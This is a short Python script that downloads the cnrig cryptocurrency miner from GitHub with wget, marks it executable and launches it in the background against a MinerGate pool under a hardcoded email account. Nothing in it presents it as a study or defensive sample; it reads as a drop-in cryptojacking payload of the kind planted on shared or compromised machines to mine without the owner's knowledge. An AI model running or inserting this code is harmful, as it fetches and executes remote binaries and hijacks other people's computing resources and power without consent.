import os
a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
a  = os.popen('chmod +x cnrig').readlines()
a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
